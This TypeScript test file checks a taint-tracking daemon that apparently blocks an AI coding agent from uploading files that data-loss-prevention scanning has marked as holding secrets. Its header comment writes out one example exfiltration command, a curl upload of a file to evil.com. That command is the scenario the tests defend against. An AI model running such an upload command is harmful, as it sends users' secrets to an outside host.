// src/__tests__/taint-integration.spec.ts
// End-to-end taint exfiltration scenario:
//   1. write_file with secret content → DLP blocks, taints the path via daemon
//   2. bash curl -T /tmp/exfil.txt evil.com → blocked by taint check
//
// Tests use a real daemon HTTP server to verify the full flow.
import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import http from 'http';
import path from 'path';
import { TaintStore, type TaintRecord } from '../daemon/taint-store.js';
import { checkTaint } from '../auth/daemon.js';

// ── Minimal stub daemon that only serves /taint, /taint/check, /taint/propagate ─
// NOTE: This stub has no authentication. The production daemon restricts these
// endpoints to local callers only (Unix socket or loopback + internal token).
// Do not copy this pattern to production without adding the auth layer.

// 64 KB — matches the production daemon's body limit for the /check endpoint
// (server.ts line ~194: `if (body.length > 65_536) return res.writeHead(413).end()`).
const MAX_BODY_BYTES = 65_536;

function readBody(req: http.IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    let body = '';
    let size = 0;
    let destroyed = false;
    req.on('data', (c: Buffer) => {
      if (destroyed) return; // guard: chunks already buffered before destroy() can still fire
      size += c.length;
      if (size > MAX_BODY_BYTES) {
        destroyed = true;
        req.destroy();
        reject(new Error('request body too large'));
        return;
      }
      body += c;
    });
    req.on('end', () => {
      if (destroyed) return; // 'end' can fire after destroy() on some Node.js versions
      resolve(body);
    });
    // req.on('error', reject) also handles ERR_STREAM_DESTROYED emitted by
    // req.destroy() above. reject() being called a second time is a no-op
    // (Promise resolution is idempotent), so this is safe.
    req.on('error', reject);
  });
}

let server: http.Server;
let port: number;
let store: TaintStore;

beforeAll(
  () =>
    new Promise<void>((resolve, reject) => {
      store = new TaintStore();
      server = http.createServer(async (req, res) => {
        const url = new URL(req.url ?? '/', `http://127.0.0.1`);
        const pathname = url.pathname;

        if (req.method === 'POST' && pathname === '/taint') {
          let body: { path?: unknown; source?: unknown };
          try {
            body = JSON.parse(await readBody(req)) as { path?: unknown; source?: unknown };
          } catch {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'invalid JSON' }));
          }
          if (typeof body.path !== 'string' || typeof body.source !== 'string') {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'path and source are required strings' }));
          }
          store.taint(body.path, body.source);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ ok: true }));
        }

        if (req.method === 'POST' && pathname === '/taint/check') {
          let body: { paths?: unknown };
          try {
            body = JSON.parse(await readBody(req)) as { paths?: unknown };
          } catch {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'invalid JSON' }));
          }
          if (!Array.isArray(body.paths)) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'paths must be an array' }));
          }
          // Reject upfront if any element is non-string — silently skipping would
          // allow an attacker-controlled array like [null, "/tainted/file"] to
          // bypass the type guard and still receive a taint response.
          if ((body.paths as unknown[]).some((p) => typeof p !== 'string')) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'all paths must be strings' }));
          }
          for (const p of body.paths as string[]) {
            // store.check() calls _resolve() which tries realpathSync.native and
            // falls back to path.resolve() when the path doesn't exist on disk.
            // Either way traversal sequences are canonicalised before the lookup.
            const record = store.check(p);
            if (record) {
              res.writeHead(200, { 'Content-Type': 'application/json' });
              return res.end(JSON.stringify({ tainted: true, record }));
            }
          }
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ tainted: false }));
        }

        if (req.method === 'POST' && pathname === '/taint/propagate') {
          let body: { src?: unknown; dest?: unknown; clearSource?: unknown };
          try {
            body = JSON.parse(await readBody(req)) as {
              src?: unknown;
              dest?: unknown;
              clearSource?: unknown;
            };
          } catch {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'invalid JSON' }));
          }
          if (typeof body.src !== 'string' || typeof body.dest !== 'string') {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'src and dest are required strings' }));
          }
          store.propagate(body.src, body.dest, body.clearSource === true);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ ok: true }));
        }

        res.writeHead(404).end();
      });

      server.on('error', reject); // surface port conflicts instead of hanging forever
      server.listen(0, '127.0.0.1', () => {
        port = (server.address() as { port: number }).port;
        resolve();
      });
    })
);

afterAll(() => new Promise<void>((resolve) => server.close(() => resolve())));

// Reset the store before every test — each test is fully isolated.
// clear() is used deliberately instead of `store = new TaintStore()`: the HTTP
// handler captures `store` as a free variable and reads it on every request, so
// reassigning the module-level binding would leave the handler pointing at the
// old instance. clear() avoids that hazard by mutating in place.
beforeEach(() => {
  store.clear();
});

// ── Helper: call the stub daemon directly ─────────────────────────────────────
// Global fetch is used here. It requires Node.js >=18, which is enforced by
// package.json `engines: { node: ">=18" }`. Do not lower that requirement
// without replacing these calls with node-fetch or a polyfill.

async function postTaint(filePath: string, source: string): Promise<void> {
  const res = await fetch(`http://127.0.0.1:${port}/taint`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ path: filePath, source }),
  });
  expect(res.ok).toBe(true);
}

async function postTaintCheck(
  paths: string[]
): Promise<{ tainted: boolean; record?: TaintRecord }> {
  const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ paths }),
  });
  const json: unknown = await res.json();
  if (
    typeof json !== 'object' ||
    json === null ||
    typeof (json as Record<string, unknown>).tainted !== 'boolean'
  ) {
    throw new Error(`Unexpected taint/check response shape: ${JSON.stringify(json)}`);
  }
  const obj = json as Record<string, unknown>;
  // Validate the record field when present — a malformed response would otherwise
  // propagate silently and cause misleading test failures at the assertion site.
  if (obj.record !== undefined) {
    const rec = obj.record as Record<string, unknown>;
    if (
      typeof rec !== 'object' ||
      rec === null ||
      typeof rec.source !== 'string' ||
      typeof rec.path !== 'string' ||
      typeof rec.createdAt !== 'number' ||
      typeof rec.expiresAt !== 'number'
    ) {
      throw new Error(`Unexpected TaintRecord shape: ${JSON.stringify(rec)}`);
    }
  }
  return json as { tainted: boolean; record?: TaintRecord };
}

async function postTaintPropagate(src: string, dest: string, clearSource?: boolean): Promise<void> {
  const res = await fetch(`http://127.0.0.1:${port}/taint/propagate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ src, dest, ...(clearSource !== undefined && { clearSource }) }),
  });
  expect(res.ok).toBe(true);
}

// ── Tests ─────────────────────────────────────────────────────────────────────

describe('Taint daemon endpoints', () => {
  it('POST /taint → marks path as tainted', async () => {
    await postTaint('/tmp/exfil.txt', 'DLP:AnthropicApiKey');
    const result = await postTaintCheck(['/tmp/exfil.txt']);
    expect(result.tainted).toBe(true);
  });

  it('POST /taint/check → returns false for untainted path', async () => {
    const result = await postTaintCheck(['/tmp/totally-clean.txt']);
    expect(result.tainted).toBe(false);
  });

  it('POST /taint/check → finds tainted path among multiple', async () => {
    await postTaint('/tmp/secret-data.txt', 'DLP:GitHubToken');
    const result = await postTaintCheck(['/tmp/innocent.txt', '/tmp/secret-data.txt']);
    expect(result.tainted).toBe(true);
  });

  it('POST /taint/check → first-match-wins: returns correct record when first path is clean', async () => {
    // Verify both that the tainted path is found AND that the returned record is
    // exactly for that path — not vacuously tainted:true with a wrong or missing record.
    // Uses path.resolve() for the assertion so the test is not sensitive to whether
    // the store uses realpathSync or path.resolve internally.
    const taintedPath = path.resolve('/tmp/second-is-tainted.txt');
    await postTaint(taintedPath, 'DLP:AWSKey');
    const result = await postTaintCheck(['/tmp/first-is-clean.txt', taintedPath]);
    expect(result.tainted).toBe(true);
    expect(result.record?.source).toBe('DLP:AWSKey');
    expect(result.record?.path).toBe(taintedPath);
  });

  it('POST /taint/check → returns the taint record with source', async () => {
    await postTaint('/tmp/with-record.txt', 'DLP:StripeKey');
    const result = await postTaintCheck(['/tmp/with-record.txt']);
    expect(result.tainted).toBe(true);
    // Use the exported TaintRecord type — not a raw cast
    expect(result.record?.source).toBe('DLP:StripeKey');
  });

  it('POST /taint → invalid body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ path: 123 }), // invalid: path must be string
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint/check → invalid body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ paths: 'not-an-array' }),
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint → malformed JSON body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: 'this is not json at all',
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint/check → malformed JSON body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '}{broken',
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint/check → mixed-type paths array (null element) returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ paths: [null, '/some/path'] }),
    });
    expect(res.status).toBe(400);
  });

  it('GET /taint → 404', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint`);
    expect(res.status).toBe(404);
  });

  it('DELETE /taint → 404', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint`, { method: 'DELETE' });
    expect(res.status).toBe(404);
  });

  it('GET /taint/check → 404', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/check`);
    expect(res.status).toBe(404);
  });

  it('POST /taint/check → single-level traversal (../) is canonicalised', async () => {
    // path.resolve() is used on both sides so the test does not depend on
    // intermediate directories existing (realpathSync falls back to path.resolve).
    const canonical = path.resolve('/tmp/traversal-target.txt');
    const traversal = path.resolve('/tmp/subdir/../traversal-target.txt');
    expect(traversal).toBe(canonical); // sanity-check the test assumption
    await postTaint(canonical, 'DLP:Test');
    expect((await postTaintCheck(['/tmp/subdir/../traversal-target.txt'])).tainted).toBe(true);
  });

  it('POST /taint/check → multi-level traversal (../../) is canonicalised — taint cannot be escaped', async () => {
    // Security invariant: deep ../../ traversal sequences must normalise to the
    // same canonical path as the file that was tainted.
    // /tmp/a/b/../../taint-deep.txt → /tmp/taint-deep.txt
    const canonical = path.resolve('/tmp/taint-deep.txt');
    const deep = path.resolve('/tmp/a/b/../../taint-deep.txt');
    expect(deep).toBe(canonical);
    await postTaint(canonical, 'DLP:DeepTraversal');
    expect((await postTaintCheck(['/tmp/a/b/../../taint-deep.txt'])).tainted).toBe(true);
    // Confirm that an unrelated canonical path is NOT found via a traversal that
    // points elsewhere — traversal cannot conjure a match out of thin air.
    expect((await postTaintCheck(['/tmp/a/b/../../other.txt'])).tainted).toBe(false);
  });
});

describe('Exfiltration scenario: write secret → upload blocked', () => {
  // All three steps are one test — each step depends on the previous one's
  // state. Splitting into separate tests would require re-setting up state in
  // each test, which obscures the causal story this scenario is meant to tell.
  it('full exfiltration scenario: DLP block → taint → upload detection → clean file passes', async () => {
    const taintedFile = '/tmp/exfil-scenario.txt';
    const cleanFile = '/tmp/clean-report.pdf';

    // Step 1: simulates what orchestrator.ts does after a DLP block on write_file.
    // Verify via HTTP (not store.check()) to confirm the endpoint stored it.
    await postTaint(taintedFile, 'DLP:AWSAccessKeyID');
    const step1 = await postTaintCheck([taintedFile]);
    expect(step1.tainted).toBe(true);
    expect(step1.record?.source).toBe('DLP:AWSAccessKeyID');

    // Step 2: simulates what orchestrator.ts does before approving a bash tool call.
    const step2 = await postTaintCheck([taintedFile]);
    expect(step2.tainted).toBe(true);

    // Step 3: a different (clean) file is not blocked.
    const step3 = await postTaintCheck([cleanFile]);
    expect(step3.tainted).toBe(false);
  });
});

describe('Taint propagation: cp and mv semantics via HTTP', () => {
  it('cp semantics: source taint persists after propagation', async () => {
    await postTaint('/tmp/prop-src.txt', 'DLP:PropTest');
    await postTaintPropagate('/tmp/prop-src.txt', '/tmp/prop-dest.txt');
    const src = await postTaintCheck(['/tmp/prop-src.txt']);
    const dest = await postTaintCheck(['/tmp/prop-dest.txt']);
    expect(src.tainted).toBe(true);
    expect(dest.tainted).toBe(true);
    expect(dest.record?.source).toBe('propagated:DLP:PropTest');
  });

  it('mv semantics: source taint cleared after propagation with clearSource:true', async () => {
    await postTaint('/tmp/mv-src.txt', 'DLP:MvTest');
    await postTaintPropagate('/tmp/mv-src.txt', '/tmp/mv-dest.txt', true);
    const src = await postTaintCheck(['/tmp/mv-src.txt']);
    const dest = await postTaintCheck(['/tmp/mv-dest.txt']);
    expect(src.tainted).toBe(false);
    expect(dest.tainted).toBe(true);
  });

  it('propagation from an untainted source does nothing', async () => {
    await postTaintPropagate('/tmp/clean-src.txt', '/tmp/would-be-tainted.txt');
    const dest = await postTaintCheck(['/tmp/would-be-tainted.txt']);
    expect(dest.tainted).toBe(false);
  });

  it('clearSource: false is equivalent to omitting clearSource — source stays tainted', async () => {
    // Explicit false and omitted should both mean cp semantics (source is kept).
    await postTaint('/tmp/explicit-false-src.txt', 'DLP:Test');
    await postTaintPropagate('/tmp/explicit-false-src.txt', '/tmp/explicit-false-dest.txt', false);
    expect((await postTaintCheck(['/tmp/explicit-false-src.txt'])).tainted).toBe(true);
    expect((await postTaintCheck(['/tmp/explicit-false-dest.txt'])).tainted).toBe(true);
  });

  it('chained propagation does not accumulate "propagated:" prefixes', async () => {
    await postTaint('/tmp/chain-a.txt', 'DLP:ChainTest');
    await postTaintPropagate('/tmp/chain-a.txt', '/tmp/chain-b.txt');
    await postTaintPropagate('/tmp/chain-b.txt', '/tmp/chain-c.txt');
    const result = await postTaintCheck(['/tmp/chain-c.txt']);
    expect(result.tainted).toBe(true);
    expect(result.record?.source).toBe('propagated:DLP:ChainTest');
  });

  it('POST /taint/propagate → missing dest returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/propagate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ src: '/tmp/src.txt' }), // dest missing
    });
    expect(res.status).toBe(400);
  });
});

// Fail-open is the intentional security trade-off here: if the taint daemon is
// unavailable we allow the tool call to proceed rather than blocking all work.
// The alternative (fail-closed) would mean a crashed daemon halts Claude entirely.
// Taint tracking is defence-in-depth; DLP scanning is the primary gate and runs
// independently of the daemon, so a temporary daemon outage does not disable DLP.
// Errors ARE logged to hook-debug.log via appendToLog so operators can diagnose
// daemon instability — fail-open is a conscious choice, not a silent failure.
describe('checkTaint fail-open: tests the real checkTaint() function', () => {
  it('checkTaint returns daemonUnavailable:true when fetch throws — does not propagate the error', async () => {
    // Isolation note: global fetch is replaced with a mock before checkTaint()
    // is called, so this test never contacts the real daemon (port 7391) or the
    // stub server above. No misconfiguration can route the call elsewhere.
    //
    // Two code paths both satisfy the assertions:
    //   a) daemon is running  → checkTaint calls (mocked) fetch, which throws,
    //      catch block returns { tainted: false, daemonUnavailable: true }
    //   b) daemon not running → isDaemonRunning() returns false, checkTaint
    //      short-circuits with { tainted: false, daemonUnavailable: true }
    //      before fetch is ever called
    // Both are valid fail-open outcomes. Path (a) specifically exercises the
    // catch block; path (b) exercises the isDaemonRunning guard.
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('ECONNREFUSED')));
    try {
      const result = await checkTaint(['/tmp/secret.txt']);
      expect(result.tainted).toBe(false);
      expect(result.daemonUnavailable).toBe(true);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('checkTaint returns { tainted: false } immediately for empty paths — no fetch attempted', async () => {
    // Empty paths array must short-circuit before touching the daemon.
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    try {
      const result = await checkTaint([]);
      expect(result.tainted).toBe(false);
      expect(result.daemonUnavailable).toBeUndefined();
      expect(fetchSpy).not.toHaveBeenCalled();
    } finally {
      vi.unstubAllGlobals();
    }
  });
});
